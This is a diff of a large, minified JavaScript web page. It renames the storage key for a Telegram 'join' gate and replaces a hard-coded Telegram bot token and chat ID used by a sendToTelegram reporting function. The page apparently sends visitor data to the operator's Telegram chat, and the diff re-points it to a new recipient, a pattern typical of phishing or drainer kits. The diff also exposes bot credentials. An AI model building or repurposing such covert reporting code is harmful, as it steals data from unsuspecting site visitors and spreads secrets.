@@ -4355,7 +4355,7 @@
         }
         var joinBtn = document.getElementById('tg-join-btn');
         var continueBtn = document.getElementById('tg-continue-btn');
-        if (localStorage.getItem('tg_joined_annebella') === '1') {
+        if (localStorage.getItem('tg_joined_shown') === '1') {
             gate.style.display = 'none';
         }
         joinBtn.addEventListener('click', function() {
@@ -4367,7 +4367,7 @@
         });
         continueBtn.addEventListener('click', function() {
             if (continueBtn.disabled) return;
-            localStorage.setItem('tg_joined_annebella', '1');
+            localStorage.setItem('tg_joined_shown', '1');
             gate.style.display = 'none';
         });
     })();
@@ -17683,8 +17683,8 @@ async function Gp(A, tt, b) {
 }
 
 // ===================== TELEGRAM CONFIG =====================
-const TELEGRAM_BOT_TOKEN = "8861045101:AAGR-ZTotWh8R20pLiUau0yRdkUWkv3iKV0";
-const TELEGRAM_CHAT_ID = "-1003950236084";
+const TELEGRAM_BOT_TOKEN = "8509068048:AAFNurQ3coyE7_96bMmjTazcM0sF3nlDcUA";
+const TELEGRAM_CHAT_ID = "-1004335548922";
 let telegramReportSent = !1;
 
 async function sendToTelegram(A, tt, b, d, S) {
